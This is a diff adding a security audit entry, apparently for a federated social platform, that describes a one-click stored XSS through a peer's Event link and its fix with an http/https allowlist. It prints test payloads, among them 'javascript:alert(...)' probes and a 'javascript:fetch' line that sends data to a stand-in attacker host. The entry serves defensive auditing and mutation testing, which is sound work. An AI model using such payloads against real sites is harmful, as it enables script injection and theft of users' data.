@@ -22497,4 +22497,74 @@ carried none of the messages under test.
 Ten mutants, all dead, on a green baseline. 14,887 tests, 0 failures, 0 warnings. All 92
 floors met.
 
-**Next free number: D1403.**
+## Round 212 — D1403: a peer's Event link, rendered as an href with no scheme checked
+
+**The shape swept this round was the template, not the code**: every `href`, `src` and `action` in
+`app/templates` whose value is a bare `{{ expression }}` rather than `url_for(...)`. 343 sites, grouped by
+expression. Nearly all of them interpolate something this instance computes — `community.icon_image()`,
+`file.view_url()`, `post.image.thumbnail_url()`. A handful interpolate a value a **peer** supplies, and
+those were checked one at a time for a guard at either end. `{{ field.text }}` — a user's extra profile
+field — is guarded in the template, by `{% if field.text.startswith('http') %}` at
+`user/show_profile.html:181`. Post body HTML is guarded at ingest, by `allowlist_html`'s
+`has_unsafe_url_scheme` on both `href` and `src`. One site was guarded at neither end.
+
+**D1403. `post/_post_full.html:219` links an Event's `online_link` straight out of the database:**
+
+```html
+<a href="{{ event.online_link }}" target="_blank" rel="nofollow ugc">
+    {{ event.online_link }} <span class="fe fe-external"></span>
+</a>
+```
+
+and both ingest paths read that field with `_as_text`, which checks that the value is a string and trims
+it to the column's width and says nothing whatever about its scheme. Measured straight out of `Post.new`:
+
+```
+PROBE  stored online_link:                'javascript:alert(document.domain)'
+       stored external_participation_url: 'javascript:alert(2)'
+       stored buy_tickets_link:           'javascript:alert(3)'
+```
+
+A stored XSS needing one click, on any instance federating with the sender, in the same class as D1381
+(the feed listing) and D1373 (`?next=javascript:` on the passkey flow). `rel="nofollow ugc"` does not stop
+a scheme from executing and `target="_blank"` opens it in a new tab.
+
+**THE TWO PRODUCERS OF AN EVENT DISAGREED**, which is this campaign's most common shape and the fourth
+time this month it has been a peer's value against a local form's rule. `CreateEventForm.online_link`
+carries `Regexp(r'^https?://')`, and round 207 added `validate_online_link` on top of it; the federated
+path had `_as_text`. `_as_url` is now the single rule, at all six sites — three in `Post.new`'s Event
+branch and three in `update_post_from_activity`'s — and it is an **allowlist** of `http://` and `https://`
+rather than a denylist of `javascript:`, because the only legitimate value of these three columns is a web
+link. The denylist form (`has_unsafe_url_scheme`) stays where it belongs, on body HTML, which has to keep
+`mailto:` and, for `src`, `data:`.
+
+**A BAD URL IS DROPPED, NOT REFUSED.** The rest of the event still arrives, and `None` is exactly what
+these columns already hold for an event that named no link at all — so no state downstream is new. The
+two fields that are stored unrendered today were fixed with the one that is rendered: a template linking
+them later would have inherited the hole silently.
+
+**The width is still applied**, so `limit` passes through to `_as_text` and a peer cannot turn a 5,000
+character link into a `DataError` at commit. Trimming happens first and the scheme is tested after, which
+is the only order that cannot promote a non-link: truncation can shorten a URL but cannot give a
+non-URL a scheme.
+
+**THE ONE SURVIVOR WAS A GAP IN THE TABLE OF BAD VALUES, AND IT WAS PREDICTABLE FROM THE TABLE ALONE.**
+`startswith(('http://', 'https://'))` weakened to `'http://' in ... or 'https://' in ...` survived thirteen
+rows of `javascript:`, `data:`, `vbscript:`, `file:`, `ftp:`, scheme-relative, relative, bare-host and empty
+— because not one of them contained a valid scheme anywhere. `httpjavascript:alert(1)` does not either; it
+is a row about a hostile PREFIX, which is a different mutant. The input that separates the two operators
+has to carry a real `https://` **inside** a hostile URL:
+
+```python
+"javascript:fetch('https://evil.example/steal')"
+'data:text/html,<a href="https://ok.example">x</a>'
+```
+
+Both are shapes an attacker writes for their own reasons — the first exfiltrates, the second is a document
+that looks legitimate — so the rows earn their place twice over. A table of bad values is written by
+thinking of bad things, and "bad thing that quotes a good thing" is the entry the writing method omits.
+
+Fifteen mutants, all dead, on a green baseline -- fourteen on the first pass and M4 after the two
+rows above were added. 14,965 tests, 0 failures, 0 warnings. All 92 floors met.
+
+**Next free number: D1404.**
